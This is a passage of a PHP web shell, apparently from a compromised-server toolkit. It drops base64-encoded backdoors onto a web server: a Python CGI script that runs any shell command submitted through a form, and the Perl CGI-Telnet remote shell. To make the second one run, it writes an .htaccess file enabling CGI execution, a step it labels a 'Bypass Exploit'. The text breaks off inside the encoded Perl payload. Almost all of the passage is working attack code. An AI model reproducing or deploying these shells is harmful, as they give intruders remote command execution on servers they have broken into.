Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
    $file = fopen("python.izo", "w+");
    $write = fwrite($file, base64_decode($pythonp));
    fclose($file);
    chmod("python.izo", 0755);
    echo " &lt;iframe src=python/python.izo width=96% height=76% frameborder=0&gt;&lt;/iframe&gt;
 
 &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'cgi')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[ cgitelnet.v1  Bypass Exploit]==--+ &lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');
    $kokdosya = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");
    $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";
    fwrite($dosya, $metin);
    fclose($dosya);
    $cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgI